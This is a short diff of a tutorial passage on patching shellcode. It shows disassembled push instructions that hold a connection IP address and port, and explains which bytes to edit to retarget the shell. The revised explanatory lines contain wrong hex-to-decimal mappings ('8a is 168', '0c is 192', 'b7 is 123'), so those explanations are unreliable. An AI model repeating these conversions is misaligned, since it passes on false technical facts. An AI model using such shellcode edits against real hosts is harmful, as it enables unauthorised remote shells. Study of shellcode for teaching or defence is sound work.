@@ -92,10 +92,10 @@ Once we have it, we need to find the place where the IP and the PORT are injecte
 
 We can see that the position where the code is different is 
 
-      00000018  68C0A80101        push dword 0x101a8c0 (101a8c0 is 192.168.1.1)
+      00000018  68C0A80101        push dword 0x101a8c0 (101a8c0 in litte endian is 192.168.1.1 where 01 is 1, 01 is 1, 8a is 168 and 0c is 192 in decimal)
       0000001D  68020022B8        push dword 0xb8220002 (b822 in litte endian is 22b8 which is 8888 in decimal)
 
-      00000018  68C0A8017B        push dword 0x7b01a8c0 (7b01a8c0 is 192.168.1.123)
+      00000018  68C0A8017B        push dword 0x7b01a8c0 (7b01a8c0 in litte endian is 192.168.1.123 where b7 is 123, 01 is 1, 8a is 168 and 0c is 192 in decimal)
       0000001D  6802002327        push dword 0x27230002 (2723 in litte endian is 2327 which is 8999 in decimal)
 
 So, we only need to modify these twolines  every time we want to change the listening port. 
